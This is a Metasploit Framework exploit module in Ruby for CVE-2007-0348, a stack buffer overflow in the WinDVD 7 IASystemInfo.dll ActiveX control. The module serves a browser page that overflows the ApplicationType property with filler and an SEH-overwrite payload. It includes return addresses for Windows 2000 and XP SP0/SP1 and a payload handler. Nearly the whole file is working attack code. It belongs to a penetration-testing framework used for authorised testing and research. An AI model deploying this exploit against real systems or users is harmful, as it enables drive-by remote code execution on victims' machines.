##
# $Id: windvd7_applicationtype.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WinDVD7 IASystemInfo.DLL ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in IASystemInfo.dll ActiveX
				control in InterVideo WinDVD 7. By sending a overly long string
				to the "ApplicationType()" property, an attacker may be able to
				execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-0348' ],
					[ 'OSVDB', '34315' ],
					[ 'BID', '23071' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4 } ],
					[ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],

				],
			'DisclosureDate' => 'Mar 20 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Build the exploit buffer
		filler = rand_text_alpha(548)
		seh = generate_seh_payload(target.ret)
		sploit = filler + seh

		# Build out the message
		content = %Q|<html>
			<object classid='clsid:B727C217-2022-11D4-B2C6-0050DA1BD906' id='#{vname}'></object>
			<script language='javascript'>
			#{strname}= new String('#{sploit}')
			#{vname}.ApplicationType = #{strname}
			</script>
			</html>
			|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end